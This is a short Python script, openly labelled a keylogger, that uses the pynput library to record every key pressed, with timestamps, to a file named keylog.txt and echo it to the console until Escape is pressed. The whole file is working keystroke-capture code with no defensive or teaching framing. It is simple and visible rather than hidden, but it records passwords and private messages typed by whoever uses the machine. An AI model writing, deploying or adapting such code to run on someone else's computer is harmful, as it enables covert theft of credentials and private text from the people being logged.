from pynput import keyboard
from datetime import datetime

# Create or open a log file
log_file = "keylog.txt"

def on_press(key):
    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(log_file, "a") as f:
            f.write(f"[{time_stamp}] Key {key.char} pressed\n")
            print(f"[{time_stamp}] Key {key.char} pressed") # Output for demonstration
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{time_stamp}] Special key {key} pressed\n")
            print(f"[{time_stamp}] Special key {key} pressed") # Output for demonstration

def on_release(key):
    if key == keyboard.Key.esc:
        return False # Stop listener when Escape is pressed

# Collect events until ESC is pressed
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keylogging stopped.")